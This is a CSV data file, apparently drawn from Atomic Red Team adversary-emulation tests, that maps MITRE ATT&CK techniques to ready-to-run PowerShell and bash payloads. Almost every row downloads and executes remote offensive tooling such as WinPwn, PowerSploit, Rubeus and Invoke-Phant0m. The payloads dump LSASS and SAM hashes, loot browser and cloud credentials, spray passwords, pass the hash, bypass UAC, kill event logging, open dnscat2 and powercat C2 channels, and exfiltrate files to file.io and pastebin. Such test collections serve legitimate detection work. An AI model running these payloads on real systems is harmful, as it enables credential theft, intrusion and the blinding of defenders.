display_name,technique_id,test_name,payload
OS Credential Dumping: LSASS Memory,T1003.001,Dump LSASS.exe Memory using Out-Minidump.ps1,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump
"
OS Credential Dumping: Security Account Manager,T1003.002,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive  "
Remote System Discovery,T1018,Get-DomainController with PowerView,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
"
System Owner/User Discovery,T1033,Find computers where user has session - Stealth mode (PowerView),"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
"
Network Service Discovery,T1046,WinPwn - fruit,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
fruit -noninteractive -consoleoutput"
Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,T1048.002,"Exfiltrate data HTTPS using curl freebsd,linux or macos","curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
"
Process Injection: Dynamic-link Library Injection,T1055.001,WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
Command and Scripting Interpreter: PowerShell,T1059.001,PowerUp Invoke-AllChecks,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks
"
Command and Scripting Interpreter: Bash,T1059.004,Command-Line Interface,"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
"
Permission Groups Discovery: Domain Groups,T1069.002,Get-DomainGroup with PowerView,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
"
Application Layer Protocol: DNS,T1071.004,DNS C2,"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
"
Data Staged: Local Data Staging,T1074.001,Stage data from Discovery.bat,"Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile #{output_file}
"
Valid Accounts: Local Accounts,T1078.003,WinPwn - Loot local Credentials - Safetykatz,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive"
System Information Discovery,T1082,WinPwn - PowerSharpPack - Seatbelt,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command ""-group=all""; pause"
Account Discovery: Domain Account,T1087.002,WinPwn - generaldomaininfo,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput"
Non-Application Layer Protocol,T1095,Powercat C2,"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
"
Native API,T1106,WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
Brute Force: Password Spraying,T1110.003,WinPwn - DomainPasswordSpray Attacks,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords"
Peripheral Device Discovery,T1120,WinPwn - printercheck,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput"
Access Token Manipulation: Token Impersonation/Theft,T1134.001,`SeDebugPrivilege` token duplication,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
"
Create Process with Token,T1134.002,WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
Network Share Discovery,T1135,WinPwn - shareenumeration,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput"
Create Account: Local Account,T1136.001,Create a new Windows admin user via .NET,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
Browser Extensions,T1176,Google Chrome Load Unpacked Extension With Command Line,"
# Chromium
$chromium =  ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip""

# uBlock Origin Lite to test side-loading
$extension = ""https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip""

Set-Location ""#{working_dir}""

Set-Variable ProgressPreference SilentlyContinue
Invoke-WebRequest -URI $chromium -OutFile ""#{working_dir}\chrome.zip""
Invoke-WebRequest -URI $extension -OutFile ""#{working_dir}\extension.zip""


Expand-Archive chrome.zip -DestinationPath ""#{working_dir}"" -Force
Expand-Archive extension.zip -Force

Start-Process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -PassThru"
Forced Authentication,T1187,WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true"""
Password Policy Discovery,T1201,Get-DomainPolicy with PowerView,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
"
User Execution: Malicious File,T1204.002,LNK Payload Download,"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""
$file1 = ""$env:Temp\test10.lnk""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F
"
User Execution: Malicious Image,T1204.003,Malicious Execution from Mounted ISO Image,"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso"" -OutFile ""$env:TEMP\qbot-test.iso"")
Mount-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso""
$mountedpath = (Get-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso"" | Get-Volume).DriveLetter
$finalpath = $mountedpath + "":\""
cd $finalpath
.\calc.exe.lnk"
Remote Access Software,T1219,ScreenConnect Application Download and Install on Windows,"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""
msiexec /i $installer /qn
"
Domain Trust Discovery,T1482,Get-ForestTrust with PowerView,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
"
Software Discovery,T1518,WinPwn - powerSQL,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput"
Data from Cloud Storage Object,T1530,Azure - Scan for Anonymous Access to Azure Storage (Powershell),"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""GET""}
catch [system.net.webexception]
{if($_.Exception.Response -ne $null)
{$Response = $_.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = ""The storage account could not be anonymously accessed.""}}
""Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append
"
Event Triggered Execution: Component Object Model Hijacking,T1546.015,COM hijacking via TreatAs,"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f

reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f

rundll32.exe -sta ""AtomicTest"" "
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,T1547.001,PowerShell Registry RunOnce,"$RunOnceKey = ""#{reg_key_path}""
set-itemproperty $RunOnceKey ""NextRun"" '#{thing_to_execute} ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'
"
Abuse Elevation Control Mechanism: Bypass User Account Control,T1548.002,WinPwn - UAC Bypass DccwBypassUAC technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
Use Alternate Authentication Material: Pass the Hash,T1550.002,Invoke-WMIExec Pass the Hash,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}"
Unsecured Credentials: Credentials In Files,T1552.001,"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
SharpCloud -consoleoutput -noninteractive  "
Unsecured Credentials: Private Keys,T1552.004,CertUtil ExportPFX,"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
"
Unsecured Credentials: Cloud Instance Metadata API,T1552.005,Azure - Dump Azure Instance Metadata from Virtual Machines,"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > #{output_file}
"
Subvert Trust Controls: Install Root Certificate,T1553.004,Add Root Certificate to CurrentUser Certificate Store,"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
"
Credentials from Password Stores,T1555,WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
decryptteamviewer -consoleoutput -noninteractive  "
Credentials from Password Stores: Credentials from Web Browsers,T1555.003,WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command ""all"""
Credentials from Password Stores: Windows Credential Manager,T1555.004,WinPwn - Loot local Credentials - Invoke-WCMDump,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump"
Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,T1557.001,LLMNR Poisoning with Inveigh (PowerShell),"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y"
Steal or Forge Kerberos Tickets: Kerberoasting,T1558.003,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap"""
Steal or Forge Kerberos Tickets: AS-REP Roasting,T1558.004,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap"""
Impair Defenses: Disable or Modify Tools,T1562.001,WinPwn - Kill the event log services for stealth,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
inv-phantom -consoleoutput -noninteractive  "
Impair Defenses: Disable Windows Event Logging,T1562.002,Kill Event Log Service Threads,"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
"
Hide Artifacts: Hidden Window,T1564.003,Headless Browser Accessing Mockbin,"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}
"
Hide Artifacts: NTFS File Attributes,T1564.004,Alternate Data Streams (ADS),"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""
extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
"
Phishing: Spearphishing Attachment,T1566.001,Download Macro-Enabled Phishing Attachment,"$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
"
Exfiltration Over Web Service: Exfiltration to Text Storage Sites,T1567.003,Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""
"
Group Policy Discovery,T1615,WinPwn - GPORemoteAccessPolicy,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPORemoteAccessPolicy -consoleoutput -noninteractive"
Reflective Code Loading,T1620,WinPwn - Reflectively load Mimik@tz into memory,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive"
